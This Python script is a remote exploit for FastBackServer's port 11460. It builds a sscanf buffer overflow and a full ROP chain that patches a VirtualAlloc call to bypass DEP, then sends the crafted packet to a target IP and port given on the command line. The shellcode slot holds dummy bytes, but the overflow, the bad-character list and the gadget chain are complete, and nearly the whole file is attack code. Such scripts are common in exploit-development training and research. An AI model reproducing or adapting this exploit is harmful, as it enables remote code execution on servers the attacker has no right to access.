#!/usr/bin/python

import socket
import sys
from struct import pack

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# psAgentCommand
buf= bytearray([0x41]*0x0C) # ??
buf += pack('<i', 0x0534) # Opcode for execution path
buf += pack('<i', 0x0) # offset 1
buf += pack('<i', 0x500) # size 1
buf += pack('<i', 0x0) # offset 2
buf += pack('<i', 0x100) # size 2
buf += pack('<i', 0x0) # offset 3
buf += pack('<i', 0x100) # size 3
buf += bytearray([0x41]*0x8) # ??

# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20
# Buffer overflow sscanf call: FastBackServer!FXCLI_SetConfFileChunk+0x40
# ROP starts at return from this sscanf

# psCommandBuffer

### [ ] PUSH VirtualAlloc SKELETON ###
# va = skeleton VirtualAlloc call
va  = pack('<L', 0x56697274) # address of VirtualAlloc placeholder
va += pack('<L', 0x7368656c) # address of shellcode placeholder
va += pack('<L', 0x7368656c) # lpAddress placeholder
va += pack('<L', 0x42424242) # dwSize placeholder
va += pack('<L', 0x43434343) # flAllocationType placeholder
va += pack('<L', 0x45454545) # flProtect placeholder
### [ ] PUSH VirtualAlloc SKELETON ###

# pre eip overflow offset (this gets sent before 'va', but needs to know its length)
offset = bytearray([0x50]*(276 - len(va))) 

### [ ] ALIGN REGISTER TO VirtualAlloc RETURN ###
eip  = pack('<L', 0x50501110) # push esp ; push eax ; pop edi ; pop esi ; ret
# subtract 0x1c from esi (distance from esp to VirtualAlloc placeholder address)
rop  = pack('<L', 0x5050118e) # mov eax, esi; pop esi; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xffffffe4) # -0x1c
rop += pack('<L', 0x5051579a) # add eax, ecx; ret
rop += pack('<L', 0x5052f773) # push eax ; pop esi; ret
### [X] ALIGN REGISTER TO VirtualAlloc RETURN ###

### [ ] PATCH VirtualAlloc RETURN ADDRESS ###
# dereference VirtualAlloc IAT pointer into skeleton's VirtualAlloc addr
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0x5054a221) # IAT VirtualAlloc pointer + 1 (to avoid bad char)
rop += pack('<L', 0x505410f4) # dec eax; pop ebp; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x5051f278) # mov eax, [eax]; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax; ret
### [X] PATCH VirtualAlloc RETURN ADDRESS ###

### [ ] PATCH SHELLCODE RETURN ADDRESS ###
# increment esi down to skeleton's shellcode addr, input shellcode addr
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5050118e) # mov eax, esi ; pop esi ; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack("<L", 0x5052f773) # push eax ; pop esi ; ret
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xfffffedc) # -0x124, dist to shellcode (at end of rop) from skeleton return addr
rop += pack('<L', 0x50533bf4) # sub eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
### [X] PATCH SHELLCODE RETURN ADDRESS ###

### [ ] PATCH lpAddress ###
# increment esi to lpAddress, replace with shellcode address
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5050118e) # mov eax, esi ; pop esi ; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack("<L", 0x5052f773) # push eax ; pop esi ; ret
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xfffffee0) # -0x120, distance to shellcode (at end of rop) from lpAddress
rop += pack('<L', 0x50533bf4) # sub eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
### [X] PATCH lpAddress ###

### [ ] PATCH dwSize ###
# increment esi to dwSize, replace with 0x01
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0xffffffff) # -0x01
rop += pack('<L', 0x5051d0ec) # neg eax ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
### [X] PATCH dwSize ###

### [ ] PATCH flAllocationType ###
# increment esi to flAllocationType, replace with 0x1000
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2a ; ret
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0x80808080) # 80808080 + 7f7f8f80 = 1000
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0x7f7f8f80) # 80808080 + 7f7f8f80 = 1000
rop += pack('<L', 0x5051579a) # add eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
### [X] PATCH flAllocationType ###

### [ ] PATCH flProtect ###
# increment esi to flProtect, replace with 0x40
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0xffffffc0) # -0x40
rop += pack('<L', 0x5051d0ec) # neg eax ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
### [X] PATCH flProtect ###

# rop += pack('<L', 0x5051e4db) # int3 ; push eax ; call esi (used as a debugger breakpoint)

### [ ] RETURN TO VirtualAlloc CALL ###
# update pointer and return into filled VirtualAlloc call
rop += pack('<L', 0x5050118e) # mov eax, esi ; pop esi ; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xffffffe8) # -0x18 (24 decimal) distance up to Virtual Alloc
rop += pack('<L', 0x5051579a) # add eax, ecx ; ret
rop += pack('<L', 0x5051571f) # xchg eax, ebp ; ret
rop += pack('<L', 0x50533cbf) # mov esp, ebp ; pop ebp ; ret
# junk value not needed here since esp is changed, will grab junk from new esp space
### [X] RETURN TO VirtualAlloc CALL ###

# Placeholder shellcode, right after rop in memory to return into after VirtualAlloc
shellcode = bytearray([0x69]*512) # dummy shellcode space

# format string of first buffer, expected input with overflow parameter
buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(offset+va+eip+rop+shellcode,0,0,0,0)
# Checksum + buf (psAgentCommand and psCommandBuffer)
buf = pack('>i', len(buf)-4) + buf
# buf += bytearray([0x61]*0x100) # buffer 1
# buf += bytearray([0x62]*0x200) # buffer 2
# buf += bytearray([0x63]*0x300) # buffer 3

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
